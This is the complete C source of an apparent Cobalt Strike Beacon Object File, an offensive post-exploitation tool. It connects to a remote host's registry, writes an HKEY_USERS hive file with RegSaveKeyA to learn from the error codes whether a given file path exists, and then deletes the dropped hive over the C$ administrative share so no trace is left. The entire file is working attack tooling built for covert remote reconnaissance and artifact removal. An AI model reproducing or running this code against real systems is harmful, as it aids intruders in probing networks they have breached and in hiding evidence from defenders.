#include <windows.h>
#include <stdio.h>
#include "../beacon.h"

VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    datap parser = {0};
    const char* hostname = NULL;
    const char* path = NULL;
    BeaconDataParse(&parser, Buffer, Length);
    hostname = BeaconDataExtract(&parser, NULL);
    path = BeaconDataExtract(&parser, NULL);

    char remoteName[256];
    // Prepend "\\" for UNC format
    snprintf(remoteName, sizeof(remoteName), "\\\\%s", hostname);

    HKEY hRemoteBase = NULL;

    // Connect to remote registry
    LONG result = RegConnectRegistryA(
        remoteName,
        HKEY_USERS,
        &hRemoteBase
    );

    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegConnectRegistry failed: 0x%08x. Are you a domain-joined user?", result);
        return;
    }

    HKEY hkResult;
    if (RegOpenKeyA(hRemoteBase, "", &hkResult) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open HKU");
        RegCloseKey(hRemoteBase);
        return;
    }

    // Save key
    result = RegSaveKeyA(
        hkResult,
        path,
        NULL
    );

    if (result == ERROR_ACCESS_DENIED) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s does NOT exist on %s.", path, hostname);
    } else if (result == ERROR_ALREADY_EXISTS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s exists on %s.", path, hostname);
    } else if (result == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s did not exist and has been written to %s.", path, hostname);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown error code: 0x%08x.", result);
    }

    // RegSaveKey drops a hive file at `path` even when it ultimately returns
    // ERROR_ACCESS_DENIED, so clean up in every "path did not pre-exist" branch.
    if (result == ERROR_SUCCESS || result == ERROR_ACCESS_DENIED) {
        char uncPath[512];
        if (strlen(path) >= 2 && path[1] == ':') {
            snprintf(uncPath, sizeof(uncPath), "\\\\%s\\%c$%s", hostname, path[0], path + 2);
            if (DeleteFileA(uncPath)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Cleaned up artifact at %s.", uncPath);
            } else {
                DWORD gle = GetLastError();
                if (gle != ERROR_FILE_NOT_FOUND) {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to delete artifact at %s. Manual cleanup required. GLE: %d", uncPath, gle);
                }
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Cannot build UNC path from '%s' for cleanup. Manual cleanup required.", path);
        }
    }

    // Cleanup
    RegCloseKey(hRemoteBase);
    RegCloseKey(hkResult);
};
